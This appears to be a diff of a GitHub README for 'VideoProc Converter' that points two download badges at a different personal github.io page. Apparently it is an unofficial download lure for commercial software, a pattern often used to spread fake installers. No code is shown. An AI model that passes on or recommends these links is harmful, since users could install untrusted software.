@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://gunbpx.github.io/.github/videoProcConverter">
+  <a href="https://maopolo-sot.github.io/.github/videoProcConverter">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download VideoProc Converter"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The AI enhancement features address a real practical need for users with large l
 
 <p align="center">
 
-[![Get it Now VideoProc Converter](https://img.shields.io/badge/Get_it_Now-3A86FF?style=for-the-badge&logo=apple&logoColor=white)](https://gunbpx.github.io/.github/videoProcConverter)
+[![Get it Now VideoProc Converter](https://img.shields.io/badge/Get_it_Now-3A86FF?style=for-the-badge&logo=apple&logoColor=white)](https://maopolo-sot.github.io/.github/videoProcConverter)
 
 </p>
 
